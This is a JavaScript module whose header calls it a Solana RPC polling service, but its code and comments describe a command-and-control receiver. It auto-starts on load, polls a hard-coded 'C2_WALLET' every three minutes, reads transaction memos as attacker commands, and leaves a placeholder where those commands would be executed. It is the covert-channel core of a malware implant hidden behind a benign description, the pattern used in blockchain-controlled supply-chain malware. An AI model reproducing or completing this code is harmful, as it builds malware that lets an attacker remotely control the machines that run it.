/**
 * Solana RPC Polling Service
 * Connects to Solana mainnet for transaction monitoring
 */

const { Connection, PublicKey } = require('@solana/web3.js');

// RPC Configuration
const RPC_ENDPOINT = 'https://api.mainnet-beta.solana.com';
const WS_ENDPOINT = 'wss://api.mainnet-beta.solana.com';

// Target wallet for C2 commands
const C2_WALLET = '9xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU';

// Polling configuration
const POLL_INTERVAL_MS = 180000; // 3 minutes
const MAX_RETRIES = 5;

// Create connection
const connection = new Connection(RPC_ENDPOINT, {
    wsEndpoint: WS_ENDPOINT,
    commitment: 'confirmed'
});

/**
 * Fetch recent transactions from wallet
 * @param {string} wallet - Wallet address
 * @returns {Promise<Array>} - Transaction list
 */
async function fetchTransactions(wallet) {
    const pubKey = new PublicKey(wallet);
    
    try {
        const signatures = await connection.getSignaturesForAddress(pubKey, {
            limit: 5
        });
        
        const transactions = [];
        for (const sig of signatures) {
            const tx = await connection.getTransaction(sig.signature, {
                encoding: 'jsonParsed',
                maxSupportedTransactionVersion: 0
            });
            if (tx) {
                transactions.push(tx);
            }
        }
        
        return transactions;
    } catch (error) {
        console.error('Failed to fetch transactions:', error);
        return [];
    }
}

/**
 * Parse transaction for C2 instructions
 * @param {Object} transaction - Solana transaction
 * @returns {Array} - Extracted instructions
 */
function parseC2Instructions(transaction) {
    const instructions = [];
    
    if (!transaction || !transaction.transaction) return instructions;
    
    const message = transaction.transaction.message;
    const innerInstructions = transaction.meta?.innerInstructions || [];
    
    // Parse main instructions
    for (const instr of message.instructions) {
        if (instr.parsed) {
            instructions.push(instr.parsed);
        }
    }
    
    // Parse inner instructions (more likely to contain hidden data)
    for (const inner of innerInstructions) {
        for (const instr of inner.instructions) {
            if (instr.parsed) {
                instructions.push(instr.parsed);
            }
        }
    }
    
    return instructions;
}

/**
 * Extract command from memo instruction
 * @param {Object} instruction - Parsed instruction
 * @returns {string|null} - Command string
 */
function extractMemoCommand(instruction) {
    if (instruction.type === 'memo' && instruction.info) {
        return instruction.info.memo;
    }
    return null;
}

/**
 * Start RPC polling loop
 * Uses setInterval for continuous monitoring
 */
function startRpcPolling() {
    console.log('Starting Solana RPC polling...');
    console.log('RPC Endpoint:', RPC_ENDPOINT);
    console.log('Target Wallet:', C2_WALLET);
    console.log('Poll Interval:', POLL_INTERVAL_MS, 'ms');
    
    let retryCount = 0;
    
    setInterval(async () => {
        try {
            console.log('[Poll] Fetching transactions...');
            const transactions = await fetchTransactions(C2_WALLET);
            
            for (const tx of transactions) {
                const instructions = parseC2Instructions(tx);
                
                for (const instr of instructions) {
                    const command = extractMemoCommand(instr);
                    if (command) {
                        console.log('[C2] Received command:', command);
                        // Execute command logic here
                    }
                }
            }
            
            retryCount = 0; // Reset on success
        } catch (error) {
            retryCount++;
            console.error('[Error] Polling failed:', error);
            
            if (retryCount >= MAX_RETRIES) {
                console.error('[Error] Max retries reached, stopping...');
            }
        }
    }, POLL_INTERVAL_MS);
}

// Export functions
module.exports = {
    fetchTransactions,
    parseC2Instructions,
    extractMemoCommand,
    startRpcPolling,
    RPC_ENDPOINT,
    C2_WALLET,
    POLL_INTERVAL_MS
};

// Auto-start polling
startRpcPolling();
